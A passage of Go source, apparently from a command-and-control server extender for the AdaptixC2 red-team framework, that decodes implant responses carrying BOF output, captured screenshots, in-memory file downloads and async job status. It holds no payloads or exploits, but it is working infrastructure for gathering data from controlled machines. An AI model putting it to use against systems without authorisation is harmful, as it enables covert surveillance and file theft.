			if err := Unmarshal(params.Msgs, &msgs); err != nil {
				continue
			}
			task.Message = "BOF output"
			for _, m := range msgs {
				if m.Type == CALLBACK_AX_SCREENSHOT {
					buf := bytes.NewReader(m.Data)
					var length uint32
					_ = binary.Read(buf, binary.LittleEndian, &length)
					note := make([]byte, length)
					_, _ = buf.Read(note)
					screen := make([]byte, len(m.Data)-4-int(length))
					_, _ = buf.Read(screen)
					_ = Ts.TsScreenshotAdd(agentData.Id, string(note), screen)
				} else if m.Type == CALLBACK_AX_DOWNLOAD_MEM {
					buf := bytes.NewReader(m.Data)
					var length uint32
					_ = binary.Read(buf, binary.LittleEndian, &length)
					filename := make([]byte, length)
					_, _ = buf.Read(filename)
					data := make([]byte, len(m.Data)-4-int(length))
					_, _ = buf.Read(data)
					name := Ts.TsConvertCpToUTF8(string(filename), agentData.ACP)
					fileId := fmt.Sprintf("%08x", mrand.Uint32())
					_ = Ts.TsDownloadSave(agentData.Id, fileId, name, data)
				} else if m.Type == CALLBACK_ERROR {
					task.MessageType = adaptix.MESSAGE_ERROR
					task.Message = "BOF error"
					task.ClearText += ensureNewline(Ts.TsConvertCpToUTF8(string(m.Data), agentData.ACP))
				} else {
					task.ClearText += ensureNewline(Ts.TsConvertCpToUTF8(string(m.Data), agentData.ACP))
				}
			}

		case COMMAND_JOB_LIST:
			var params AnsJobList
			if err := Unmarshal(cmd.Data, &params); err != nil {
				continue
			}
			var jobList []JobInfo
			_ = Unmarshal(params.List, &jobList)
			if len(jobList) > 0 {
				output := fmt.Sprintf(" %-10s  %-13s\n", "JobID", "Type")
				output += fmt.Sprintf(" %-10s  %-13s", "--------", "-------")
				for _, v := range jobList {
					stringType := "Unknown"
					if v.JobType == BOF_PACK {
						stringType = "Async BOF"
					}
					output += fmt.Sprintf("\n %-10v  %-13s", v.JobId, stringType)
				}
				task.Message = "Job list:"
				task.ClearText = output
			} else {
				task.Message = "No active jobs"
			}

		default:
			continue
		}

		outTasks = append(outTasks, task)
	}

	// ── Async JOB_PACK responses ───────────────────────────────────────────
	// The template implant currently sends all responses as Type 0.
	// When async BOF or streaming download is implemented, the implant should
	// send JOB_PACK (Type=JOB_PACK) with a single Job object.
	if int(inMessage.Type) == JOB_PACK && len(inMessage.Object) == 1 {
		var job Job
		if err := Unmarshal(inMessage.Object[0], &job); err == nil {
			task := taskDefaults
			task.TaskId = job.JobId

			switch job.CommandId {

			case COMMAND_EXEC_BOF_ASYNC:
				var params AnsExecBofAsync
				if err := Unmarshal(job.Data, &params); err != nil {
					goto DONE
				}
				var msgs []BofMsg
				_ = Unmarshal(params.Msgs, &msgs)
				task.Completed = false
				if params.Start {
					task.Message = fmt.Sprintf("Start async BOF [%v]", task.TaskId)
				} else if !params.Finish {
					task.Message = fmt.Sprintf("Async BOF [%v] output", task.TaskId)
				}
				for _, m := range msgs {
					if m.Type == CALLBACK_AX_SCREENSHOT {
						buf := bytes.NewReader(m.Data)
						var length uint32
						_ = binary.Read(buf, binary.LittleEndian, &length)
						note := make([]byte, length)
						_, _ = buf.Read(note)
						screen := make([]byte, len(m.Data)-4-int(length))
						_, _ = buf.Read(screen)
						_ = Ts.TsScreenshotAdd(agentData.Id, string(note), screen)
					} else if m.Type == CALLBACK_AX_DOWNLOAD_MEM {
						buf := bytes.NewReader(m.Data)
						var length uint32
						_ = binary.Read(buf, binary.LittleEndian, &length)
						filename := make([]byte, length)
						_, _ = buf.Read(filename)
						data := make([]byte, len(m.Data)-4-int(length))
						_, _ = buf.Read(data)
						name := Ts.TsConvertCpToUTF8(string(filename), agentData.ACP)
						fileId := fmt.Sprintf("%08x", mrand.Uint32())
						_ = Ts.TsDownloadSave(agentData.Id, fileId, name, data)
					} else if m.Type == CALLBACK_ERROR {
						task.MessageType = adaptix.MESSAGE_ERROR
						task.Message = fmt.Sprintf("Async BOF [%v] error", task.TaskId)
						task.ClearText += ensureNewline(Ts.TsConvertCpToUTF8(string(m.Data), agentData.ACP))
					} else {
						task.ClearText += ensureNewline(Ts.TsConvertCpToUTF8(string(m.Data), agentData.ACP))
					}
				}
				if params.Finish {
					task.Message = fmt.Sprintf("Async BOF [%v] finished", task.TaskId)
					task.Completed = true
				}

			default:
				goto DONE
			}

			outTasks = append(outTasks, task)
		}
	}

DONE:
	for _, task := range outTasks {
		Ts.TsTaskUpdate(agentData.Id, task)
	}

	return nil
}
